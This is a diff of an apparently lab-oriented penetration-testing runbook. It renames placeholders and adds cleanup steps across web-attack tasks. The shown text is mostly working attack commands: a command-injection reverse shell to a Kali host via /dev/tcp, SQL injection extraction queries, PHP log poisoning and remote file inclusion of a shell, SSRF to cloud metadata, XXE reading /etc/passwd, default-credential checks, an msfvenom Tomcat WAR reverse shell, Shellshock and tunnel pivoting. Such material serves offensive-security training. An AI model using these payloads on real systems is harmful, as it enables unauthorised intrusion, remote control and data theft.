-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<field>=<VALUE>; <BASH> -c "exec <BASH> -i >/dev/tcp/<KALI_IP>/<PORT> 2>&1 <&1"; #' -o delivery.body '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode '<FIELD>=<BENIGN_VALUE>; <BASH> -c "exec <BASH> -i >/dev/tcp/<KALI_IP>/<PORT> 2>&1 <&1"; #' -o delivery.body '<TARGET_URL>'
 ```
 
 In the shell: `hostname; id; uname -srm; pwd`.
@@ -2411,10 +2441,10 @@ In the shell: `hostname; id; uname -srm; pwd`.
 Single-quoted carrier:
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>'; <BASH> -c \"exec <BASH> -i >/dev/tcp/<KALI_IP>/<PORT> 2>&1 <&1\"; #" -o delivery.body '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<FIELD>=<BENIGN_VALUE>'; <BASH> -c \"exec <BASH> -i >/dev/tcp/<KALI_IP>/<PORT> 2>&1 <&1\"; #" -o delivery.body '<TARGET_URL>'
 ```
 
-Double-quoted uses `<field>=<VALUE>"; <BASH> -c "exec ..."; #`. Verify as in WEXEC-04.
+Double-quoted uses `<FIELD>=<BENIGN_VALUE>"; <BASH> -c "exec ..."; #`. Verify as in WEXEC-04.
 
 | Result | Next |
 | --- | --- |
@@ -2429,8 +2459,8 @@ Enter with a calibrated true/false channel and known quote context.
 ## WSQL-02. Does a known single-quoted lookup interpret paired conditions?
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>' AND '1'='1" -o true.body '<URL>'
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<VALUE>' AND '1'='2" -o false.body '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<FIELD>=<BENIGN_VALUE>' AND '1'='1" -o true.body '<TARGET_URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<FIELD>=<BENIGN_VALUE>' AND '1'='2" -o false.body '<TARGET_URL>'
 ```
 
 | Result | Next |
@@ -2443,7 +2473,7 @@ curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --
 Write one `NULL` per column; start at the candidate width:
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<UNUSED> UNION ALL SELECT NULL,NULL,NULL -- " -o width.body '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<FIELD>=<UNUSED> UNION ALL SELECT NULL,NULL,NULL -- " -o width.body '<TARGET_URL>'
 ```
 
 Replace one `NULL` with `'owb-text'` (text) or `73190+7` (numeric) once the width holds.
@@ -2466,10 +2496,10 @@ Pick the engine expression:
 | SQLite | `sqlite_version()` | `main` |
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<UNUSED> UNION ALL SELECT NULL,sqlite_version(),NULL -- " -o engine.body '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<FIELD>=<UNUSED> UNION ALL SELECT NULL,sqlite_version(),NULL -- " -o engine.body '<TARGET_URL>'
 ```
 
-Then read one row: `(SELECT <column> FROM <table> WHERE <key>=<ID>)` in the same slot.
+Then read one row: `(SELECT <COLUMN> FROM <TABLE> WHERE <KEY>=<ID>)` in the same slot.
 
 | Result | Next |
 | --- | --- |
@@ -2482,7 +2512,7 @@ Then read one row: `(SELECT <column> FROM <table> WHERE <key>=<ID>)` in the same
 One name per request, cursor starts empty:
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<UNUSED> UNION ALL SELECT NULL,(SELECT MIN(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' AND name>''),NULL -- " -o table.body '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<FIELD>=<UNUSED> UNION ALL SELECT NULL,(SELECT MIN(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' AND name>''),NULL -- " -o table.body '<TARGET_URL>'
 ```
 
 For columns: `(SELECT MIN(name) FROM pragma_table_info('<TABLE>') WHERE name>'<CURSOR>')`.
@@ -2495,8 +2525,8 @@ For columns: `(SELECT MIN(name) FROM pragma_table_info('<TABLE>') WHERE name>'<C
 ## WSQL-06. Can one chosen scalar be verified through Boolean-only output?
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<ID> AND (length((SELECT <COLUMN> FROM <TABLE> WHERE <KEY>=<ID>))=<N>)" -o length.body '<URL>'
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<field>=<ID> AND (unicode(substr((SELECT <COLUMN> FROM <TABLE> WHERE <KEY>=<ID>),<POS>,1))=<CODE>)" -o char.body '<URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<FIELD>=<ID> AND (length((SELECT <COLUMN> FROM <TABLE> WHERE <KEY>=<ID>))=<N>)" -o length.body '<TARGET_URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --get --data-urlencode "<FIELD>=<ID> AND (unicode(substr((SELECT <COLUMN> FROM <TABLE> WHERE <KEY>=<ID>),<POS>,1))=<CODE>)" -o char.body '<TARGET_URL>'
 python3 -c 'import sys; print(chr(int(sys.argv[1])))' '<CODE>'
 ```
 
@@ -2514,7 +2544,7 @@ Test only new files. Keep the exact file field, required fields, record view and
 
 ```bash
 printf 'OWB_UPLOAD_<NONCE>\n' > marker.txt
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --form '<field>=@marker.txt;filename=owb-<NONCE>.txt;type=text/plain' -o upload.body -w 'HTTP %{http_code}\n' '<UPLOAD_URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --form '<FIELD>=@marker.txt;filename=owb-<NONCE>.txt;type=text/plain' -o upload.body -w 'HTTP %{http_code}\n' '<UPLOAD_URL>'
 curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 -o read.body '<FILE_URL>'
 cmp marker.txt read.body
 ```
@@ -2535,7 +2565,7 @@ Generate the reviewed proof file (identity, fixed callback, self-remove) with th
 ```bash
 python3 '<make-lab-upload-proof.py>' './upload-php' '<KALI_IP>' '<PORT>'
 cat './upload-php/name.txt'
-curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --form '<field>=@./upload-php/proof.php;filename=<NAME>;type=application/octet-stream' -o upload.body -w 'HTTP %{http_code}\n' '<UPLOAD_URL>'
+curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --form '<FIELD>=@./upload-php/proof.php;filename=<NAME>;type=application/octet-stream' -o upload.body -w 'HTTP %{http_code}\n' '<UPLOAD_URL>'
 curl --disable --globoff -sS --connect-timeout 5 --max-filesize 1048576 --header '@./upload-php/action.headers' --data-urlencode 'mode=proof' -o proof.body -w 'HTTP %{http_code}\n' '<FILE_URL>'
 ```
 
@@ -2596,9 +2626,9 @@ Each task needs a verified input or endpoint from WEB-06/08/12.
 ## WEB-13. Can a file parameter reach source or logs?
 
 ```bash
-curl -sS '<URL>?<FIELD>=php://filter/convert.base64-encode/resource=index.php' | base64 -d
-curl -sS -A '<?php system($_GET["c"]); ?>' '<URL>'
-curl -sS '<URL>?<FIELD>=/var/log/apache2/access.log&c=id'
+curl -sS '<TARGET_URL>?<FIELD>=php://filter/convert.base64-encode/resource=index.php' | base64 -d
+curl -sS -A '<?php system($_GET["c"]); ?>' '<TARGET_URL>'
+curl -sS '<TARGET_URL>?<FIELD>=/var/log/apache2/access.log&c=id'
 ```
 
 The first reads source; the second writes PHP into the access log; the third executes it. Use the real log path if Apache differs.
@@ -2620,7 +2650,7 @@ python3 -m http.server 80
 ```
 
 ```bash
-curl -sS '<URL>?<FIELD>=http://<KALI_IP>/shell.php&c=id'
+curl -sS '<TARGET_URL>?<FIELD>=http://<KALI_IP>/shell.php&c=id'
 ```
 
 | Result | Next |
@@ -2629,11 +2659,13 @@ curl -sS '<URL>?<FIELD>=http://<KALI_IP>/shell.php&c=id'
 | Source echoed only | Handler not parsing; **WEB-13**. |
 | Connection blocked | **PAUSE-COVERAGE**; allow `allow_url_include`. |
 
+Stop the HTTP server and delete `shell.php` after use.
+
 ## WEB-15. Does the server fetch a URL you choose?
 
 ```bash
-curl -sS '<URL>?<FIELD>=http://127.0.0.1:<PORT>/'
-curl -sS '<URL>?<FIELD>=http://169.254.169.254/latest/meta-data/'
+curl -sS '<TARGET_URL>?<FIELD>=http://127.0.0.1:<PORT>/'
+curl -sS '<TARGET_URL>?<FIELD>=http://169.254.169.254/latest/meta-data/'
 ```
 
 Use a listener (`nc -lvnp <PORT>`) to confirm a callback.
@@ -2652,7 +2684,7 @@ cat > xxe.xml <<'EOF'
 <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
 <r>&x;</r>
 EOF
-curl -sS -X POST -H 'Content-Type: application/xml' --data-binary @xxe.xml '<URL>'
+curl -sS -X POST -H 'Content-Type: application/xml' --data-binary @xxe.xml '<TARGET_URL>'
 ```
 
 | Result | Next |
@@ -2660,13 +2692,15 @@ curl -sS -X POST -H 'Content-Type: application/xml' --data-binary @xxe.xml '<URL
 | File content in the response | **WEB-13** for source, **NET-05** for config. |
 | No expansion | **PAUSE-COVERAGE**; check the parser and content type. |
 
+Delete `xxe.xml` afterwards.
+
 ## WEB-17. Is access control or a default credential the gap?
 
 ```bash
-curl -sS -i '<URL>?id=1'
-curl -sS -i '<URL>?id=2'
-curl -sS -i -u 'admin:admin' '<URL>'
-curl -sS -i -H 'X-Forwarded-For: 127.0.0.1' '<URL>/admin'
+curl -sS -i '<TARGET_URL>?id=1'
+curl -sS -i '<TARGET_URL>?id=2'
+curl -sS -i -u 'admin:admin' '<TARGET_URL>'
+curl -sS -i -H 'X-Forwarded-For: 127.0.0.1' '<TARGET_URL>/admin'
 ```
 
 | Result | Next |
@@ -2679,10 +2713,10 @@ curl -sS -i -H 'X-Forwarded-For: 127.0.0.1' '<URL>/admin'
 ## WEB-18. Is a Tomcat manager exposed?
 
 ```bash
-curl -sS -i 'http://<TARGET>:<PORT>/manager/html'
+curl -sS -i 'http://<TARGET_IP>:<PORT>/manager/html'
 msfvenom -p java/jsp_shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<PORT>' -f war -o shell.war
-curl -sS -u 'tomcat:tomcat' --upload-file shell.war 'http://<TARGET>:<PORT>/manager/text/deploy?path=/shell'
-curl -sS 'http://<TARGET>:<PORT>/shell/'
+curl -sS -u 'tomcat:tomcat' --upload-file shell.war 'http://<TARGET_IP>:<PORT>/manager/text/deploy?path=/shell'
+curl -sS 'http://<TARGET_IP>:<PORT>/shell/'
 ```
 
 | Result | Next |
@@ -2694,7 +2728,7 @@ curl -sS 'http://<TARGET>:<PORT>/shell/'
 ## WEB-19. Is a CGI script vulnerable to Shellshock?
 
 ```bash
-curl -sS -i -H 'User-Agent: () { :; }; /bin/bash -c "id"' 'http://<TARGET>/cgi-bin/<SCRIPT>'
+curl -sS -i -H 'User-Agent: () { :; }; /bin/bash -c "id"' 'http://<TARGET_IP>/cgi-bin/<SCRIPT>'
 ```
 
 | Result | Next |
@@ -2705,6 +2739,17 @@ curl -sS -i -H 'User-Agent: () { :; }; /bin/bash -c "id"' 'http://<TARGET>/cgi-b
 # access
 
 ## EXP-01. Does one candidate fit the observed endpoint and context?
+
+Find a local source, copy it once, and keep the original immutable:
+
+```bash
+searchsploit --disable-colour '<PRODUCT>' '<VERSION>'
+searchsploit -m <EDB_ID>
+file <EDB_ID>.py
+sha256sum <EDB_ID>.py
+```
+
+Read the header and the trigger path before using it. A managed module is an alternative only when its options are known.
 
 Compare the candidate with the exact product/version, the function you reached, OS and process architecture, required configuration or input, callback route, payload constraints, and recovery. A title or banner match is not applicability.
 
@@ -2845,7 +2890,7 @@ stat -c '%s %n' -- '<FILE>'; sha256sum -- '<FILE>'
 Kali:
 
 ```bash
-scp -P '<SSH_PORT>' -i '<KEY>' -o StrictHostKeyChecking=yes -o 'UserKnownHostsFile=<KNOWN_HOSTS>' '<USER>@<TARGET_IP>:<FILE>' ./artifact.bin
+scp -P '<SSH_PORT>' -i '<KEY>' -o StrictHostKeyChecking=yes -o 'UserKnownHostsFile=<KNOWN_HOSTS>' '<USERNAME>@<TARGET_IP>:<FILE>' ./artifact.bin
 sha256sum ./artifact.bin
 ```
 
@@ -2865,13 +2910,13 @@ Reach one internal service through a host you already control.
 Local forward to a service on the pivot's network:
 
 ```bash
-ssh -N -L '<LOCAL_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT>' '<USER>@<PIVOT_IP>'
+ssh -N -L '<LOCAL_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT>' '<USERNAME>@<PIVOT_IP>'
 ```
 
 Remote forward when the pivot cannot reach Kali directly:
 
 ```bash
-ssh -N -R '<KALI_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT>' '<USER>@<PIVOT_IP>'
+ssh -N -R '<KALI_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT>' '<USERNAME>@<PIVOT_IP>'
 ```
 
 | Result | Next |
@@ -2879,6 +2924,8 @@ ssh -N -R '<KALI_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT>' '<USER>@<PIVOT_IP>'
 | Port answers locally | The matching service task at `127.0.0.1:<LOCAL_PORT>`. |
 | Forward refused | Check `AllowTcpForwarding`; **PIVOT-02** instead. |
 | Auth denied | **SSH-01**. |
+
+Close the forward with Ctrl-C when the task ends.
 
 ## PIVOT-02. Can a non-SSH tunnel carry the port?
 
@@ -2902,6 +2949,8 @@ socat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<INTERNAL_HOST>:<INTERNAL_PORT>
 | Client cannot egress | Try 443/80 outbound or **PAUSE-COVERAGE**. |
 | Tunnel drops | Keep the command output; **PAUSE-RECOVERY**. |
 
+Stop the client and server with Ctrl-C after use.
+
 ## PIVOT-03. Can the internal range be scanned through the pivot?
 
 ```bash
@@ -2916,6 +2965,8 @@ Use `-sT`; SYN scans do not traverse a proxy cleanly.
 | Live internal hosts and ports | **NET-05** on that host through the same tunnel. |
 | Only timeouts | Confirm the tunnel with one known port first. |
 | Partial results | **PAUSE-COVERAGE**. |
+
+Remove the temporary proxy config afterwards.
 # local_artifact
 
 ## ART-01. Does this exact downloaded file contain a usable next lead?
